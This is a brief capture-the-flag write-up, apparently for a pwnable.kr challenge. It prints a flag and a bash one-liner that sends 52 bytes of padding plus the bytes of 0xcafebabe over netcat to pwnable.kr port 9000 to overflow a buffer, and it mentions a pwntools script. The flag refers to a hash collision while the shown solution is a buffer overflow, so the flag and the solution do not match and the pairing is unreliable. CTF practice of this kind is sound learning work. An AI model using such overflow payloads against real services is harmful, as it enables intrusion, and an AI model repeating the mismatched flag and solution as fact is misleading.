Flag: "daddy! I just managed to create a hash collision :)"

We can solve this challenge from bash using:

```bash
(python -c "print 'a'*52 + '\xbe\xba\xfe\xca'"; cat -) |
nc pwnable.kr 9000
```

Note the little trick with `cat -` to keep the connection open and listening
for our input.

We can make our solution even cleaner with a little help from [pwntools][pwn].
Check out `solve.py`.

[pwn]: https://docs.pwntools.com/en/stable/intro.html
